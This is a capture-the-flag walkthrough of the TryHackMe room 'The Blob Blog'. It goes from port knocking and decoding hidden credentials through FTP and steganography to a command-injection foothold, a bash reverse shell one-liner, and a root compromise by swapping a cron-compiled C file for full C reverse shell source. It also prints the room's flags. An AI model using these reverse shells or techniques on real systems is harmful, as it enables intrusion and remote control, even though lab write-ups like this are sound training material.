# The Blob Blog

## Description

Successfully hack into bobloblaw's computer

Can you root the box?

## Initial Scan

Let's start with an Nmap scan. The scan reveals two open ports:
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web (port 80)

Let's start with the web service. The main page is the default page for Apache2. When I checked the source code, I found a long commented base64 string:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ curl -s "http://$IP/" | head -n11

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
K1stLS0+Kys8XT4rLisrK [REDACTED] +LS4tLVstLS0+Kys8XT4tLg==
-->
~~~

After decoing it, we get a brainfuck code. I used [this](https://www.dcode.fr/brainfuck-language) website to decode it. After decoding it, we get the following message:

```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

This is refering to port knocking and gives us the sequence which we will explore later.

There is another comment at the end of the source code:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ curl -s "http://$IP/" | tail -n7
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
</html>
~~~

The weird string at the end is base58 encoded and it decodes to: `cUpC4k3s`

I tried to enumerate the webpage further but didn't find anything useful.

## Port knocking

Let's go back to that port knocking sequence (port 1, 3, 5). You can do it in different ways. I used a tool called `knock` that you can find out how to install with a small search. You can also use `nc` or a simple `bash` script. The command is:

~~~
$ knock <MACHINE IP> 1 3 5 -d 500
~~~

After port knocking, I ran Nmap again to see if we unlocked any new ports and take a look at this; we got some new ports:

~~~
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web (port 445)

The first port I checked was port 445 and the main page is the default page of Apache2. There is a comment at the top of the source code:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ curl -s "http://$IP:445/" | head -n12

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
~~~

We got a string which might be a password that we need later: `p@55w0rd`

For further enumeration, I ran `dirsearch` on this port to find directories:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ dirsearch -u http://$IP:445/ -w /usr/share/dirb/wordlists/common.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/user/.dirsearch/reports/10.10.45.106/_21-11-20_09-04-09.txt

Error Log: /home/user/.dirsearch/logs/errors-21-11-20_09-04-09.log

Target: http://10.10.45.106:445/

[09:04:09] Starting: 
[09:04:19] 200 -   11KB - /index.html
[09:04:25] 403 -  292B  - /server-status
[09:04:28] 200 -    3KB - /user

Task Completed
~~~

We found a directory named `/user`. Let's see what we can find there:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ curl -s "http://$IP:445/user"        
-----BEGIN OPENSSH PRIVATE KEY-----
KSHyMzjjE7pZPFLIWrUdNridNrips0Gtj2Yxm2RhDIkiAxtniSDwgPRkjLMRFhY=
7lR2+1NLc2iomL7nGRbDonO9qZrh0a5ciZAta4XdfH9TsYx6be6LeA5oD3BKd1bIDaVO0Q

[REDACTED]

SsIPFLIlJLIFFLIvJLxhJ0WuO9aQ4q5EkaZL11kAqbef2d5oWjkYVtQ3MhRx7mEyKbb+zu
q3GwjcSkiR1wKFzyorTFLIPFMO5kgxCPFLITgx9cOVLIPFLIPFLJPFLKUbLIPFohr2lekc
-----END OPENSSH PRIVATE KEY-----
~~~

It is am SSSH private key. I tried different things on it, but couldn't do anything with it.

## FTP

Let's check out another newly unlocked port, the FTP service on port 21. We have a username (`bob`) and two possible passwords. I successfully logged in with the username and `cUpC4k3s` as password and downlaoded the only useful file, which is an image :

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ ftp $IP
Connected to 10.10.45.106.
220 (vsFTPd 3.0.2)
Name (10.10.45.106:user): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001          220 Jul 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25  2020 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25  2020 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25  2020 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 .
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001         8183 Jul 28  2020 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.
8183 bytes received in 0.00 secs (6.4124 MB/s)
ftp> exit
221 Goodbye.
~~~

I guessed that there might be something hidden inside the image. I used `steghide` and the other password (`p@55w0rd`) and extracted a txt file named `out.txt`. Let's read the content:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ steghide extract -sf cool.jpeg
Enter passphrase: 
wrote extracted data to "out.txt".
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ cat out.txt 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
~~~

We found a directory and some encoded creds. I tried the directory on all web services and it was available on port 445:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ curl -s "http://$IP:445/bobs_safe_for_stuff"
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
~~~

I'm gonna make it short for you. The creds we found is encoded with Vigenère and the key to decode it is `youmayenter`. I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('')) to decode the cipher and now we have creds:
* Username: `bob`
* Password: `d1ff3r3ntP@55w0rd`

## Web (port 8080)

Now it's time for the last web service. Like others, the main page is the default page of Apache2. I ran `dirsearch` on it to find directories:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/The_Blob_Blog]
└─$ dirsearch -u http://$IP:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Output File: /home/user/.dirsearch/reports/10.10.183.181/_21-11-21_01-11-50.txt

Error Log: /home/user/.dirsearch/logs/errors-21-11-21_01-11-50.log

Target: http://10.10.45.106:8080/

[01:11:50] Starting: 
[01:11:53] 200 -  553B  - /blog
[01:11:54] 200 -  546B  - /login
[01:12:09] 200 -   39B  - /review
[01:18:39] 200 -   63B  - /blog1

[REDACTED]
~~~

There is a `/login` directory, and as the note said, we need to get into the blog. I used the creds we just found (`bob:d1ff3r3ntP@55w0rd`), and logged in from the login page and faced this page:

<p align="center"><img src="./files/blog.png"></p>

## Reverse shell

The blog posts are just there to be there. Nothing useful in them, but the input field executes commands with no filter. I opened a listener (`rlwrap nc -lvnp 4444`) and executed a bash reverse shell:

~~~
bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1
~~~

Then click on "here" and the shell will be executed. Now we have a shell as `www-data`. The first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.1.83] from (UNKNOWN) [10.10.45.106] 53758
bash: cannot set terminal process group (463): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bobloblaw-VirtualBox:~/html2$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@bobloblaw-VirtualBox:~/html2$ 
~~~

## www-data -> bobloblaw (lateral move)

If you list `/home`, you can see that there are two users: `bob` which we had access to his home directory from the FTP service and `bobloblaw` that we need to switch to.

Unfortunately, we don't have permission to enter to bobloblaw's home directory. I used `find` command to find the files owned by `bobloblaw` (Ignore the messages. We'll get to it later):

~~~
www-data@bobloblaw-VirtualBox:~$ find / -type f -user bobloblaw 2>/dev/null
You haven't rooted me yet? Jeez
You haven't rooted me yet? Jeez
You haven't rooted me yet? Jeez
/usr/bin/blogFeedback
~~~

There is a binary that looks interesting.

### Reverse Engineering

Download the binary using a python server on the target machine running in `/usr/bin` (`python3 -m http.server 8000`) and download it on your machine using `wget` (`wget http://$IP:8000/blogFeedback`). Now start analyzing it with a disassembler of your choice. I used `ghidra`. Here's the main function of the binary:

~~~s
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    local_c = 1;
    while (local_c < 7) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
      local_c = local_c + 1;
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}
~~~

I analyzed the binary, but I'm not gonna put the whole thing here except the main function. First it checks the number of arguments and if it is run without the 6 required args, it will stop. If the number of arguments is correct, the program continues and loops through the args one by one and checks if `arg[i] = 7 - i` which means we are counting down from 6 to 1.

When the loop completes, a shell will be spawned (`system("/bin/sh")`). So we should count from 6 to 1 as argument. Let's see if this theory works:

~~~
www-data@bobloblaw-VirtualBox:~$ /usr/bin/blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
~~~

Great! Now we have a shell run as user `bobloblaw`.

## User flag

I spawned a TTY shell and started looking for the user flag and found it in `/home/bobloblaw/Desktop`:

~~~
$ SHELL=/bin/bash script -q /dev/null
bobloblaw@bobloblaw-VirtualBox:~$ cd /home/bobloblaw/Desktop
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
~~~

User Flag: `THM{C0NGR4t$_g3++ing_this_fur}`

## Connecting via SSH

There is a SSH private key in `/home/bobloblaw/.ssh/id_rsa`. Copy it to your machine, set its permission to 600 and now we can connect to the target machine via ssh as user `bobloblaw`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ chmod 600 bll_rsa
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ ssh -i bll_rsa bobloblaw@$IP
Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * "If you've been waiting for the perfect Kubernetes dev solution for
   macOS, the wait is over. Learn how to install Microk8s on macOS."

   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/

0 packages can be updated.
0 updates are security updates.

Failed to connect to http://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Sun Nov 21 03:38:19 2021 from 10.9.1.83
bobloblaw@bobloblaw-VirtualBox:~$ id
uid=1000(bobloblaw) gid=1000(bobloblaw) groups=1000(bobloblaw),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),131(sambashare)
~~~

## Going root

### Rabbit holes

I dont't wanna waste your time, so I'm gonna go through the rabbit holes first. Then i will show you da way.

### Privileges

First I checked my sudo permissions by running `sudo -l`, and we can execute two commands as `root`, but I couldn't find anything for these binaries in GTFOBins:

~~~
bobloblaw@bobloblaw-VirtualBox:~$ sudo -l
Matching Defaults entries for bobloblaw on bobloblaw-VirtualBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobloblaw may run the following commands on bobloblaw-VirtualBox:
    (root) NOPASSWD: /bin/echo, /usr/bin/yes
~~~

### Crontab

I checked `/etc/crontab` to see if there is any cronjob running on the machine:

~~~
bobloblaw@bobloblaw-VirtualBox:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
~~~

This cronjob is being run by root and the file is located in our desktop, but it is only accessible to root:

~~~
bobloblaw@bobloblaw-VirtualBox:~$ ls -la Desktop/.uh_oh/
ls: cannot open directory 'Desktop/.uh_oh/': Permission denied
~~~

### Pictures in Desktop

There are two pictures in our Desktop with interesting names:

~~~
bobloblaw@bobloblaw-VirtualBox:~$ ls Desktop/
dontlookatthis.jpg  lookatme.jpg  user.txt
~~~

I guess that I might find something inside them, so I tansfered them to my machine using `scp`:

~~~
$ scp -i bll_rsa bobloblaw@$IP:/home/bobloblaw/Desktop/dontlookatthis.jpg .
$ scp -i bll_rsa bobloblaw@$IP:/home/bobloblaw/Desktop/lookatme.jpg .
~~~

I used `steghide` to extracte the file(s) inside the pictures and none of them required a passphrase. I extracted `dontlook.txt` from `dontlookatthis.jpg`. The message is encoded. First we decode it from base64 and get a hex string and after decoding it from hex, we get this message:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ steghide extract -sf dontlookatthis.jpg
Enter passphrase: 
wrote extracted data to "dontlook.txt".
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ cat dontlook.txt | base64 -d | xxd -r
 told you not to
~~~

We got nothing. I extracted `whatscooking.txt` from `lookatme.jpg` and got a binary:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ steghide extract -sf lookatme.jpg      
Enter passphrase: 
wrote extracted data to "whatscooking.txt".
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ cat whatscooking.txt 
01001011 01111001 01110011 01110010 01001011 01111001 01110011 [REDACTED]
~~~

We can decode it with the following pattern: binary > base64 > brainfuck. The result is:

```
The stove's timer is about to go off... there are some other timers too...
```

### Privlege Escalation

At this point, my only hope was the annoying message that we are keep getting. I used `grep` command to look through all the files in the machine and found the same string in a file. It is located in `/home/bobloblaw/Documents`:

~~~
bobloblaw@bobloblaw-VirtualBox:~$ grep "You haven't rooted me yet? Jeez" /* -r 2>/dev/null
/home/bobloblaw/Documents/.boring_file.c:	printf("You haven't rooted me yet? Jeez\n");
Binary file /home/bobloblaw/Documents/.also_boring/.still_boring matches
~~~

This is `boring_file.c` and it has the same message:

~~~c
#include <stdio.h>
int main() {
  printf("You haven't rooted me yet? Jeez\n");
  return 0;

}
~~~

I changed the C code (`/home/bobloblaw/Documents/.boring_file.c`) to test if this is the source of the message, by changing the message and adding the system command `id` to see who it is run by and waited a bit and now take look at the new message:

~~~
bobloblaw@bobloblaw-VirtualBox:~/Documents$ uid=0(root) gid=0(root) groups=0(root)
This is the source
~~~

I realized that the C code compiles to `/home/bobloblaw/Documents/.also_boring/.still_boring` and is run by root.

We can add a command to read the root flag, but where is the fun in that when we can root the machine. I replaced the code with a C reverse shell which you can find [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c) using `nano` editor. Here's the reverse shell. Just change the IP to yours and replace it with the C code:

~~~c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("<YOUR IP>");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
~~~

Now open a listener (`rlwrap nc -lvnp 4242`) and wait a bit and you'll get a shell as `root`. The first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/The_Blob_Blog/files]
└─$ rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.9.1.83] from (UNKNOWN) [10.10.45.106] 38866
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
root@bobloblaw-VirtualBox:/root#
~~~

## Root flag

Now we can read the root flag in `/root`:

~~~
root@bobloblaw-VirtualBox:/root# ls
root.txt
root@bobloblaw-VirtualBox:/root# cat root.txt
THM{G00D_J0B_G3++1NG+H3R3!}
~~~

Root Flag: `THM{G00D_J0B_G3++1NG+H3R3!}`

# D0N3! ; )

Thanks to the creator(s) for this fun room!

Hope you had fun and learned something.

Have a g00d one! : )